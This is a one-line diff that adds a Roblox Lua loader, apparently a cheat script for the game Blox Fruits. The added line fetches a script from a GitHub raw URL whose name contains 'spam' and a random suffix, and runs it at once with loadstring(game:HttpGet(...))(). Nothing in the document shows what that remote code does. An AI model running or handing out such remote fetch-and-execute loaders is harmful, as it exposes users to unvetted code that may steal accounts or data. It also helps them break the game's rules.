@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/blox-fruits-spam4-5dpk76vxje3e9q.lua"))()
